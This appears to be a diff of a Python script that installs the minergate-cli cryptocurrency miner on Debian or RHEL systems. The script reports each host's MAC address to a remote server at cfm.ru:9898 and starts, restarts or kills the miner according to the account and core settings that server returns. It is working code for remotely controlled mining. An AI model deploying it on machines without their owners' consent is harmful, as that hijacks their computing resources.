@@ -13,6 +13,8 @@ def Msg(data,type):
         sys.stdout.write(RESET)
 
 
+type_os = ''
+
 def Initialize():
     try:
         subprocess.call(["pip3","install","-r","requirements.txt"])
@@ -20,16 +22,25 @@ def Initialize():
     except:
         Msg('Module setup completed','error')
     try:
-        subprocess.call(["dpkg","-i","minergate-cli.deb","-y"])
+        subprocess.call(["dpkg","-i","minergate-cli.deb"])
         Msg('Install for debian base','ok')
+
+        with open('./conf.py','w') as f:
+            f.write('config = [{"os":"deb"}]')
+
         return True
     except:
         Msg('NO deb','error')
+
 
     try:
         subprocess.call(["dnf","install","lib64xcb-sync0-1.9.1-2.1.mga4.x86_64.rpm","-y"])
         subprocess.call(["dnf","install","minergate-cli.rpm","-y"])
         Msg('Install for RHEL base','ok')
+        type_os = "rpm"
+        with open('./conf.py','w') as f:
+            f.write('config = [{"os":"rpm"}]')
+
         return True
     except:
         Msg('NO RHEL','error')
@@ -48,8 +59,6 @@ import traceback
 
 
 
-uuid = '50c441ab-05a0-423f-a511-3b93a7dfa29c'
-index = '5'
 
 
 
@@ -79,11 +88,26 @@ print(GetMac(),GetCores())
 
 
 
+
+uuid = '50c441ab-05a0-423f-a511-3b93a7dfa29c'
+index = GetMac() 
+
+
 def StartMiner():
-    r = req.get('http://cfm.ru:9898/?uuid='+uuid+'&index='+index)
-    param = json.loads(r.text)
-    p = subprocess.Popen(["minergate-cli", "--user",param[0]['mail'], "--"+param[0]['val']+"",str(param[0]['core'])],stdout=subprocess.PIPE)
-    return True
+    from conf import config
+
+    if config[0]['os'] == 'deb':
+        r = req.get('http://cfm.ru:9898/?uuid='+uuid+'&index='+index)
+        param = json.loads(r.text)
+        p = subprocess.Popen(["minergate-cli", "-user",param[0]['mail'], "-"+param[0]['val']+"",str(param[0]['core'])],stdout=subprocess.PIPE)
+        return True
+
+    if config[0]['os'] == 'rpm':
+        r = req.get('http://cfm.ru:9898/?uuid='+uuid+'&index='+index)
+        param = json.loads(r.text)
+        p = subprocess.Popen(["minergate-cli", "--user",param[0]['mail'], "--"+param[0]['val']+"",str(param[0]['core'])],stdout=subprocess.PIPE)
+        return True
+
 
 
 def CheckProcess():
@@ -112,6 +136,7 @@ def KillProcess():
 r = req.get('http://cfm.ru:9898/?uuid='+uuid+'&index='+index)
 param = json.loads(r.text)
 
+
 if param[0]['change'] == True:
     KillProcess()
     StartMiner()
@@ -120,6 +145,9 @@ else:
     pass
 
 
+
+
+#KillProcess()
 #print(KillProcess())
 #print(StartMiner())
 #print(CheckProcess())
